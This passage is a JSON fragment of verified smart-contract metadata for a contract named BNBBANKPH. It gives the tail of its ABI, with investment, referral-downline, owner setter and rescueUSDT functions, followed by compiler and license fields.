,{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"nextWithdraw\",\"outputs\":[{\"internalType\":\"uint40\",\"name\":\"next_sked\",\"type\":\"uint40\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"players\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"dividends\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_ref_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_reinvested\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"lastWithdrawn\",\"type\":\"uint40\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ref_bonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rescueUSDT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newval\",\"type\":\"uint256\"}],\"name\":\"setDays\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newval\",\"type\":\"address\"}],\"name\":\"setDev\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newval\",\"type\":\"uint8\"}],\"name\":\"setScheduled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tarifs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"life_days\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"for_withdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_ref_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"lastPayout\",\"type\":\"uint40\"},{\"internalType\":\"uint256\",\"name\":\"numDeposits\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"downlines1\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"downlines2\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"downlines3\",\"type\":\"uint256\"},{\"internalType\":\"uint256[3]\",\"name\":\"structure\",\"type\":\"uint256[3]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BNBBANKPH", "CompilerVersion": "v0.8.9+commit.e5eed63a", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c7535906c5ae266e93a879a310b5d959ca06586203ee50a6db2b9c68bc73855f"}